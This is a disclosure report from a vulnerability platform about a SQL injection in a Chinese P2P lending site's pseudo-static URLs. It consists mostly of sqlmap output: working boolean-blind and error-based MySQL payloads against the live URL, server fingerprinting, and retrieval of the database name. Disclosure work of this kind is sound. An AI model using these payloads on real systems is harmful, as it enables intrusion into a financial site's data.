wybug_title: P2P安全之网信贷主站伪静态SQL注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-11-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-01-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  伪静态注入漏洞漏洞地址:
http://wangxindai.cn/invest/full_success/a20150900003.html

URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 466 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: http://wangxindai.cn:80/invest/full_success/a20150900003 RLIKE (SELECT (CASE WHEN (1218=1218) THEN 0x613230313530393030303033 ELSE 0x28 END)).html    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: http://wangxindai.cn:80/invest/full_success/a20150900003 AND EXTRACTVALUE(7991,CONCAT(0x5c,0x716a716a71,(SELECT (ELT(7991=7991,1))),0x7171707671)).html---[11:47:05] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.3.29back-end DBMS: MySQL 5.1[11:47:05] [INFO] fetching database names[11:47:07] [WARNING] the SQL query provided does not return any output[11:47:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[11:47:07] [INFO] fetching number of databases[11:47:07] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:47:07] [INFO] retrieved:[11:47:10] [ERROR] unable to retrieve the number of databases[11:47:10] [INFO] falling back to current database[11:47:10] [INFO] fetching current database[11:47:10] [INFO] retrieved: ptpsavailable databases [1]:[*] ptps
